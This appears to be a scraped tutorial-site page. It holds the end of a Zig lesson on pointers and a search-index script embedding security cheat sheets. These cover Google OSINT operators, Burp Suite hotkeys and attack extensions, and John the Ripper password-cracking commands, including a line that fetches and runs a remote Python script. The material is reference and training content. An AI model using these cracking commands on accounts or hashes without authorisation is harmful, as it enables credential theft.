	};

	std.debug.print(&#34;{any}\n{any}&#34;, .{leto, duncan});
}

pub const User = struct {
	id: u64,
	power: i32,
	// changed from ?const User -&gt; ?*const User
	manager: ?*const User,
};</code>
  </pre>
  </div>
<p>You might never need a recursive structure, but this isn&rsquo;t about data modeling. It&rsquo;s about understanding pointers and memory models and better understanding what the compiler is up to.</p>
<p>A lot of developers struggle with pointers, there can be something elusive about them. They don&rsquo;t feel concrete like an integer, or string or User. None of this has to be crystal clear for you to move forward. But it is worth mastering, and not just for Zig. These details might be hidden in languages like Ruby, Python and JavaScript, and to a lesser extent C#, Java and Go, but they&rsquo;re still there, impacting how you write code and how that code runs. So take your time, play with examples, add debug print statements to look at variables and their address. The more you explore, the clearer it will get.</p>

    </div>

    





    
    






<div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3">
    <div id="edit-this-page" class="mt-1">
        <a href="https://github.com/AkhilSharma90/Akhil-Tutorials-Website/blob/release/content/docs/zig/zig/pointers_in_zig.md" alt="Pointers in Zig" rel="noopener noreferrer" target="_blank">
            
            <span class="me-1 align-text-bottom">
                
                    <svg width="20px" height="20px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
  <path d="M16 0.396c-8.839 0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183 0.803 0.151 1.093-0.344 1.093-0.772 0-0.38-0.009-1.385-0.015-2.719-4.453 0.964-5.391-2.151-5.391-2.151-0.729-1.844-1.781-2.339-1.781-2.339-1.448-0.989 0.115-0.968 0.115-0.968 1.604 0.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328 0.14-1.031 0.557-1.74 1.011-2.135-3.552-0.401-7.287-1.776-7.287-7.907 0-1.751 0.62-3.177 1.645-4.297-0.177-0.401-0.719-2.031 0.141-4.235 0 0 1.339-0.427 4.4 1.641 1.281-0.355 2.641-0.532 4-0.541 1.36 0.009 2.719 0.187 4 0.541 3.043-2.068 4.381-1.641 4.381-1.641 0.859 2.204 0.317 3.833 0.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297 0 6.145-3.74 7.5-7.296 7.891 0.556 0.479 1.077 1.464 1.077 2.959 0 2.14-0.020 3.864-0.020 4.385 0 0.416 0.28 0.916 1.104 0.755 6.4-2.093 10.979-8.093 10.979-15.156 0-8.833-7.161-16-16-16z"/>
</svg>

                
            </span>
            Edit this page
            
        </a>
    </div>
    
    <div id="last-modified" class="mt-1">
        <p class="mb-0 fw-semibold">Last updated <span
            id="relativetime"
            data-authdate="2024-06-14T03:48:12&#43;0200"
            title="14 Jun 2024, 03:48 SAST">
            14 Jun 2024, 03:48 SAST
        </span>. <span class="material-icons size-20 align-text-bottom opacity-75">history</span>
        </p>
    </div>
    
</div>

    

    
                                        </div>
                                        <div><hr class="doc-hr">
<div id="doc-nav" class="d-print-none">

	<div class="row flex-xl-nowrap ">
	<div class="col-sm-6 pt-2 doc-next">
		<a href="/tutorials/docs/erlang/erlang/pattern_matching/">
			<div class="card h-100 my-1">
				<div class="card-body py-2">
                    <p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Pattern Matching in Erlang</p>
					<p class="card-text ms-2"></p>
					
				</div>
			</div>
		</a>
        </div>
	<div class="col-sm-6 pt-2 doc-prev">
		<a class="ms-auto" href="/tutorials/docs/erlang/erlang/applications_and_best_practices/">
			<div class="card h-100 my-1 text-end">
				<div class="card-body py-2">
                    <p class="card-title fs-5 fw-semibold lh-base mb-0">Practical Applications and Best Practices <i class="material-icons align-middle">navigate_next</i></p>
					<p class="card-text me-2">Explore real-world …</p>
					
				</div>
			</div>
		</a>
        </div>
	</div>
</div></div>
                                    </div>
                                </div>
                            </div>
                        </div>
<footer class="shadow py-3 d-print-none">
    <div class="container-fluid">
        <div class="row align-items-center">
            <div class="col">
                <div class="text-sm-start text-center mx-md-2">
                    <p class="mb-0">
                        
                        
                    </p>
                </div>
            </div>
        </div>
    </div>
</footer>
</main>
        </div>
    </div>

    
    
    <button onclick="topFunction()" id="back-to-top" aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12,10.224l-6.3,6.3L4.32,15.152,12,7.472l7.68,7.68L18.3,16.528Z" style="fill:#fff"/></svg></button>
    
    

    
    
        <script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script>
    




    
        
        
    
    






    <script src="/tutorials/docs/js/bootstrap.js" defer></script>


    <script type="text/javascript" src="http://localhost:1313/tutorials/docs/js/bundle.js" defer></script>
    

    
    <script type="module">
    var suggestions = document.getElementById('suggestions');
    var search = document.getElementById('flexsearch');

    const flexsearchContainer = document.getElementById('FlexSearchCollapse');

    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');

    const configObject = { toggle: false }
    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 

    if (search !== null) {
        document.addEventListener('keydown', inputFocus);
        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
            search.focus();
        });
        
        var topHeader = document.getElementById("top-header");
        document.addEventListener('click', function(elem) {
            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
                flexsearchContainerCollapse.hide();
        });
    }

    hideFlexsearchBtn.addEventListener('click', () =>{
        flexsearchContainerCollapse.hide()
    })

    function inputFocus(e) {
        if (e.ctrlKey && e.key === '/') {
            e.preventDefault();
            flexsearchContainerCollapse.toggle();
        }
        if (e.key === 'Escape' ) {
            search.blur();
            
            flexsearchContainerCollapse.hide();
        }
    };

    document.addEventListener('click', function(event) {

    var isClickInsideElement = suggestions.contains(event.target);

    if (!isClickInsideElement) {
        suggestions.classList.add('d-none');
    }

    });

    


    document.addEventListener('keydown',suggestionFocus);

    function suggestionFocus(e) {
    const suggestionsHidden = suggestions.classList.contains('d-none');
    if (suggestionsHidden) return;

    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
    if (focusableSuggestions.length === 0) return;

    const index = focusableSuggestions.indexOf(document.activeElement);

    if (e.key === "ArrowUp") {
        e.preventDefault();
        const nextIndex = index > 0 ? index - 1 : 0;
        focusableSuggestions[nextIndex].focus();
    }
    else if (e.key === "ArrowDown") {
        e.preventDefault();
        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
        focusableSuggestions[nextIndex].focus();
    }

    }

    


    (function(){

    var index = new FlexSearch.Document({
        
        tokenize: "forward",
        minlength:  0 ,
        cache:  100 ,
        optimize:  true ,
        document: {
        id: 'id',
        store: [
            "href", "title", "description"
        ],
        index: ["title", "description", "content"]
        }
    });


    


    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    


    

    

    index.add(
            {
                id:  0 ,
                href: "\/tutorials\/docs\/cheatsheets\/osint_cs\/",
                title: "OSINT ( Google operators list )",
                description: "Search operator What it does Example “ ” Search for results that mention a word or phrase. https://www.google.com/search?q=%22steve+jobs%22 OR Search for results related to X or Y. https://www.google.com/search?\u0026q=jobs+OR+gates Same as OR: AND Search for results related to X and Y. https://www.google.com/search?\u0026q=jobs+AND+gates - Search for results that don’t mention a word or phrase. https://www.google.com/search?q=jobs+-apple * Wildcard matching any word or phrase. https://www.google.com/search?q=%22steve+*+apple%22 ( ) Group multiple searches. https://www.google.com/search?q=%28ipad+OR+iphone%29+apple define: Search for the definition of a word or phrase.",
                content: " Search operator What it does Example “ ” Search for results that mention a word or phrase. https://www.google.com/search?q=%22steve+jobs%22 OR Search for results related to X or Y. https://www.google.com/search?\u0026q=jobs+OR+gates Same as OR: AND Search for results related to X and Y. https://www.google.com/search?\u0026q=jobs+AND+gates - Search for results that don’t mention a word or phrase. https://www.google.com/search?q=jobs+-apple * Wildcard matching any word or phrase. https://www.google.com/search?q=%22steve+*+apple%22 ( ) Group multiple searches. https://www.google.com/search?q=%28ipad+OR+iphone%29+apple define: Search for the definition of a word or phrase. https://www.google.com/search?q=define%3Aentrepreneur cache: Find the most recent cache of a webpage. https://webcache.googleusercontent.com/search?q=cache%3Aapple.com filetype: Search for particular types of files (e.g., PDF). https://www.google.com/search?q=apple+filetype%3Apdf ext: Same as filetype: https://www.google.com/search?q=apple+ext%3Apdf site: Search for results from a particular website. https://www.google.com/search?q=site%3Aapple.com related: Search for sites related to a given domain. https://www.google.com/search?q=related%3Aapple.com intitle: Search for pages with a particular word in the title tag. https://www.google.com/search?q=intitle%3Aapple allintitle: Search for pages with multiple words in the title tag. https://www.google.com/search?q=allintitle%3Aapple+iphone inurl: Search for pages with a particular word in the URL. https://www.google.com/search?q=inurl%3Aapple allinurl: Search for pages with multiple words in the URL. https://www.google.com/search?q=allinurl%3Aapple+iphone intext: Search for pages with a particular word in their content. https://www.google.com/search?q=intext%3Aapple allintext: Search for pages with multiple words in their content. https://www.google.com/search?q=allintext%3Aapple+iphone weather: Search for the weather in a location. https://www.google.com/search?q=weather%3Asan+francisco stocks: Search for stock information for a ticker. https://www.google.com/search?q=stocks%3Aaapl map: Force Google to show map results. https://www.google.com/search?q=map%3Asilicon+valley movie: Search for information about a movie. https://www.google.com/search?q=movie%3Asteve+jobs in Convert one unit to another. https://www.google.com/search?q=$329+in+GBP source: Search for results from a particular source in Google News. https://www.google.com/search?q=apple+source%3Athe_verge\u0026tbm=nws before: Search for results from before a particular date. https://www.google.com/search?q=apple+before%3A2007-06-29 after: Search for results from after a particular date. https://www.google.com/search?q=apple+after%3A2007-06-29 "
            }
        );
    index.add(
            {
                id:  1 ,
                href: "\/tutorials\/docs\/cheatsheets\/burp_suite_cs\/",
                title: "Burp Suite Cheat sheet",
                description: "Tool Specific Hotkeys link Ctrl-F: Forward Request (Proxy) Ctrl-T: Toggle Proxy Intercept On/Off Ctrl-Space: Send Request (Repeater) Double-click TAB: Rename a tab Navigational Hotkeys link Ctrl-Shift-T: Target Tab Ctrl-Shift-P: Proxy Tab Ctrl-Shift-R: Repeater Tab Ctrl-Shift-I: Intruder Tab Ctrl-Shift-O: Project Options Tab Ctrl-Shift-D: Dashboard Tab Ctrl-Equal: Next tab Ctrl-Minus: Previous tab Editor Encoding / Decoding Hotkeys link Ctrl-B: Base64 selection Ctrl-Shift-B: Base64 decode selection Ctrl-H: Replace with HTML Entities (key characters only) Ctrl-Shift-H: Replace HTML entities with characters Ctrl-U: URL encode selection (key characters only) Ctrl-Shift-U: URL decode selection Global Hotkeys link Ctrl-I: Send to Intruder Ctrl-R: Send to Repeater Ctrl-S: Search (places cursor in search field) Ctrl-.",
                content: "Tool Specific Hotkeys link Ctrl-F: Forward Request (Proxy) Ctrl-T: Toggle Proxy Intercept On/Off Ctrl-Space: Send Request (Repeater) Double-click TAB: Rename a tab Navigational Hotkeys link Ctrl-Shift-T: Target Tab Ctrl-Shift-P: Proxy Tab Ctrl-Shift-R: Repeater Tab Ctrl-Shift-I: Intruder Tab Ctrl-Shift-O: Project Options Tab Ctrl-Shift-D: Dashboard Tab Ctrl-Equal: Next tab Ctrl-Minus: Previous tab Editor Encoding / Decoding Hotkeys link Ctrl-B: Base64 selection Ctrl-Shift-B: Base64 decode selection Ctrl-H: Replace with HTML Entities (key characters only) Ctrl-Shift-H: Replace HTML entities with characters Ctrl-U: URL encode selection (key characters only) Ctrl-Shift-U: URL decode selection Global Hotkeys link Ctrl-I: Send to Intruder Ctrl-R: Send to Repeater Ctrl-S: Search (places cursor in search field) Ctrl-.: Go to next selection Ctrl-,: Go to previous selection Ctrl-A: Select all Ctrl-Z: Undo Ctrl-Y: Redo Editors Hotkeys link Ctrl-Delete: Delete Word Ctrl-D: Delete Line Ctrl-Backspace: Delete Word Backwards Ctrl-Home: Go to beginning of the document Ctrl-End: Go to end of the document Ctrl-Left/Right: Navigate words Ctrl-Shift: Select data on its way Hunting for Vulnerabilities link Param Miner: Identifies unlinked parameters. Backslash Powered Scanner: Alerts on data transformations. Software Vulnerability Scanner: Checks software versions against known vulnerabilities. Authorization and Authentication link SAML-Raider: Inspect and modify SAML messages. JSON Web Tokens: Decode and manipulate JWTs on the fly. Autorize: Check access control for different roles or unauthenticated users. More Vulnerability Hunting Tools link HTTP Request Smuggler: Launch HTTP Request Smuggling attacks. Active Scan++: Additional vulnerability scanning capabilities. Retire.js: Identify outdated JavaScript libraries with associated CVEs. Utilities link Logger++: Log and monitor attacks; sort by status code. Turbo Intruder: High-speed, customizable HTTP request sending. Taborator: Ease Burp Collaborator usage for call-back vulnerabilities. REST API link Enable in user options, default access at http://127.0.0.1:1337/. Interact via web application, not just CLI. Use cURL commands for interaction with Burp’s features in headless mode. API Examples link List defined issues: curl -X GET 'http://127.0.0.1:1337/v0.1/knowledge_base/issue_definitions' Scan a URL: curl -X POST 'http://127.0.0.1:1337/v0.1/scan' -d '{\"urls\":[\"http://target1.com\",\"http://target2.com\"]}' Check scan status: curl -X GET 'http://127.0.0.1:1337/v0.1/scan/' "
            }
        );
    index.add(
            {
                id:  2 ,
                href: "\/tutorials\/docs\/cheatsheets\/john_the_ripper_cs\/",
                title: "John the ripper Cheat Sheet",
                description: "John Installation link git clone https://github.com/openwall/john -b bleeding-jumbo /data/tools/john ; cd /data/tools/john/src/ ; ./configure \u0026\u0026 make -s clean \u0026\u0026 make -sj4 ; cd ~ John Modes link Wordlist mode (dictionary attack) - john --wordlist= Mangling rules mode - john --wordlist= --rules: Incremental mode - john --incremental External mode - john --external: Loopback mode (use .pot files) - john --loopback Mask mode - john --mask=?1?1?1?1?1?1?1?1 -1=[A-Z] -min-len=8 Markov mode - calc_stat markovstats john -markov:200 -max-len:12 --mkv-stats=markovstats Prince mode - john --prince= Refer the link for more examples.",
                content: "John Installation link git clone https://github.com/openwall/john -b bleeding-jumbo /data/tools/john ; cd /data/tools/john/src/ ; ./configure \u0026\u0026 make -s clean \u0026\u0026 make -sj4 ; cd ~ John Modes link Wordlist mode (dictionary attack) - john --wordlist= Mangling rules mode - john --wordlist= --rules: Incremental mode - john --incremental External mode - john --external: Loopback mode (use .pot files) - john --loopback Mask mode - john --mask=?1?1?1?1?1?1?1?1 -1=[A-Z] -min-len=8 Markov mode - calc_stat markovstats john -markov:200 -max-len:12 --mkv-stats=markovstats Prince mode - john --prince= Refer the link for more examples.\nCPU and GPU options link List opencl devices - john --list=opencl-devices List formats supported by opencl - john --list=formats --format=opencl Use multiple CPU - john hashes --wordlist: --rules: --dev=2 --fork=4 Use multiple GPU - john hashes --format: --wordlist: --rules: --dev=0,1 --fork=2 Rules link Single wordlist Extra Jumbo (Single, wordlist and Extra) KoreLogic All (Single, wordlist, Extra and KoreLogic) Incremental modes link Lower (26 char) Alpha (52 char) Digits (10 char) Alnum (62 char) New rule link [List.Rules:Tryout] l [convert to lowercase] u [convert to uppercase] c [capitalize] l r [lowercase and reverse (palindrome)] l Az\"2015\" [lowercase and append \"2015\" at end of word] l A0\"2015\" [lowercase and prepend \"2015\" at end of word] d [duplicate] A0\"#\"Az\"#\" [append and prepend \"#\"] Display password candidates - john --wordlist= --stdout --rules:Tryout Generate password candidates - john --wordlist= --stdout=8 --rules:Tryout Other rules link C [lowercase first char, uppercase rest] t [toggle case of all chars] TN [toggle case of char in position N] r [reverse word - test123 -\u003e 321tset] d [duplicate word - test123 -\u003e test123test123] f [reflect word - test123 -\u003e test123321tset] { [rotate word left - test123 -\u003e est123t] } [rotate word right - test123 -\u003e 3test12] $X [append word with X] ^X [prefix word with X] [ [remove first char] ] [remove last char] DN [delete char in posision N] xNM [extract from position N till M chars] iNX [insert X in place of N and shift rest right] oNX [overwrite N with X] S [shift case - test123 -\u003e TEST!@#] V [lowercase vowels, uppercase consonents - test123 -\u003e TeST123] R [shift each char right, using keyboard key - test123 -\u003e yrdy234] L [shift each char left, using keyboard key - test123 -\u003e rwar012] N [reject words unless greater than length N] N [truncate to length N] New charset link john --make-charset=set.char Create john.conf with character set config.\n# Incremental modes [Incremental:charset] File = $JOHN/set.char MinLen = 0 MaxLen = 30 CharCount = 80 john --incremental=charset Wordlists link Sort wordlist - tr A-Z a-z \u003c | sort -u \u003e Generate wordlist using POT - cut -d: -f2 john.pot | sort -u \u003e pot.dict Generate candidate pwd for slow hash - john --wordlist= --stdout --rules:Jumbo | unique -mem=25 External mode link Create complex password list - link Generate wordlist according to complexity filter - ./john --wordlist= --stdout --external: \u003e Use adjacent keys on keyboard - john --external:Keyboard Misc Options link Hidden options - john --list=hidden-options Display guesses - john --incremental:Alpha -stdout -session=s1 Generate guesses with external programs - crunch 1 6 abcdefg | ./john hashes -stdin -session=s1 Save session - john hashes -session=name Restore session - john --restore:name Show cracked passwords - john hashes --pot= --show Dictionaries link Generate wordlist from wikipedia - wget https://raw.githubusercontent.com/zombiesam/wikigen/master/wwg.py ; python wwg.py -u http://pt.wikipedia.org/wiki/Fernando_Pessoa -t 5 -o fernandopessoa -m3 Aspell dictionary - apt-get install aspell-es aspell dump dicts aspell -d es dump master | aspell -l es expand | awk 1 RS=\" |\\n\" \u003e aspell.dic John The Ripper Hash Formats link afs – Kerberos AFS DES: AFS (Andrew File System) uses Kerberos for authentication. The DES (Data Encryption Standard) is used for the encryption of Kerberos tickets. bfegg – Eggdrop: Eggdrop is an IRC bot software, and bfegg is the format used for storing user passwords in Eggdrop using Blowfish encryption. bf – OpenBSD Blowfish: This is a Blowfish-based password hashing method, commonly used in OpenBSD for encrypting passwords. bsdi – BSDI DES: A format used by BSDI operating systems for password hashing, based on the DES algorithm. crypt – generic crypt(3): A generic format for the Unix crypt(3) function, which can support various hashing algorithms. des – Traditional DES: The traditional DES (Data Encryption Standard) format used for Unix passwords. dmd5 – DIGEST-MD5: A challenge-response scheme based on MD5 used in HTTP and other protocols for authentication. dominosec – More Secure Internet Password: Used by Lotus Domino for password hashing. EPiServer SID Hashes: EPiServer uses a specific format for hashing, but there’s no specific format flag in JtR. hdaa – HTTP Digest access authentication: Used in HTTP for digest access authentication. hmac-md5 – HMAC MD5: A format using HMAC (Hash-based Message Authentication Code) with MD5 hashing. hmailserver – hmailserver: A format used by hMailServer, an email server for Windows, for storing passwords. ipb2 – IPB2 MD5: A format used by Invision Power Board (IPB) version 2.x for password storage. krb4 – Kerberos v4 TGT: Used for Kerberos version 4 Ticket Granting Tickets. krb5 – Kerberos v5 TGT: Used for Kerberos version 5 Ticket Granting Tickets. lm – LM DES: The LAN Manager (LM) hash, an old hashing format used by Microsoft for storing passwords. lotus5 – Lotus5: Used by Lotus Notes/Domino 5 for password storage. md4-gen – Generic salted MD4: A generic format for salted MD4 hashes. md5 – FreeBSD MD5: A version of MD5 used in FreeBSD for password hashing. md5-gen – Generic MD5: A generic format for MD5 hashes. mediawiki – MediaWiki MD5s: Used by MediaWiki for password storage. mscash – M$ Cache Hash: Used by Microsoft for caching domain credentials. mscash2 – M$ Cache Hash 2 (DCC2): An updated version of the Microsoft cache hash. mschapv2 – MSCHAPv2 C/R MD4 DES: Used in Microsoft’s MSCHAPv2 protocol for VPN and WPA2 enterprise. mskrb5 – MS Kerberos 5 AS-REQ Pre-Auth: Microsoft’s implementation of Kerberos 5 pre-authentication. mssql05 – MS-SQL05: Used by Microsoft SQL Server 2005 for password storage. mssql – MS-SQL: Used by Microsoft SQL Server for password storage. mysql-fast – MYSQL_fast: A fast hash format used by MySQL databases. mysql – MYSQL: The standard hash format used by MySQL databases. mysql-sha1 – MySQL 4.1 double-SHA-1: Used by MySQL 4.1 and above, applying double SHA-1 hashing. netlm – LM C/R DES: Network version of LM hashes used in Windows networks. netlmv2 – LMv2 C/R MD4 HMAC-MD5: An updated version of the network LM hash. netntlm – NTLMv1 C/R MD4 DES [ESS MD5]: NTLM version 1 challenge/response format. netntlmv2 – NTLMv2 C/R MD4 HMAC-MD5: NTLM version 2 challenge/response format. nethalflm – HalfLM C/R DES: A format representing half of an LM hash, used in certain Windows network authentication scenarios. md5ns – Netscreen MD5: Used by Netscreen devices for password hashing with MD5. nsldap – Netscape LDAP SHA: SHA-1 based hash used in Netscape LDAP. ssha – Netscape LDAP SSHA: Salted SHA-1 hash used in Netscape LDAP. nt – NT MD4: The NT hash, a MD4-based format used in Windows NT, 2000, XP, and later. openssha – OpenLDAP SSHA: Salted SHA-1 hash used in OpenLDAP. oracle11 – Oracle 11g: Hash format used by Oracle Database 11g. oracle – Oracle: Hash format used by Oracle databases. pdf – PDF: Used for password hashing in PDF files. phpass-md5 – PHPass MD5: Used in PHP applications, notably WordPress, for password hashing. phps – PHPS MD5: MD5-based hash used in some PHP applications. pix-md5 – PIX MD5: Cisco PIX firewall password hash format. po – Post.Office MD5: Used by the Post.Office mail server. rar – rar: Used for password protection in RAR archives. raw-md4 – Raw MD4: Plain MD4 hash. raw-md5 – Raw MD5: Plain MD5 hash. raw-md5-unicode – Raw MD5 of Unicode plaintext: MD5 hashing of Unicode plaintext. raw-sha1 – Raw SHA-1: Plain SHA-1 hash. raw-sha224 – Raw SHA-224: Plain SHA-224 hash. raw-sha256 – Raw SHA-256: Plain SHA-256 hash. raw-sha384 – Raw SHA-384: Plain SHA-384 hash. raw-sha512 – Raw SHA-512: Plain SHA-512 hash. salted-sha – Salted SHA: A generic format for salted SHA-1 hashes. sapb – SAP BCODE: Used by SAP systems for password hashing. sapg – SAP CODVN G (PASSCODE): Another hash format used by SAP systems. sha1-gen – Generic salted SHA-1: A generic format for salted SHA-1 hashes. skey – S/Key: One-time password system based on MD4 and MD5. ssh – ssh: Used for SSH private keys. sybasease – sybasease: Used by Sybase ASE for password storage. xsha – Mac OS X 10.4+ salted SHA-1: Used in Mac OS X 10.4 and later for password hashing. zip – zip: Used for password-protected ZIP files. "
            }
        );
    index.add(
            {
                id:  3 ,
                href: "\/tutorials\/docs\/cheatsheets\/metasploit_cs\/",
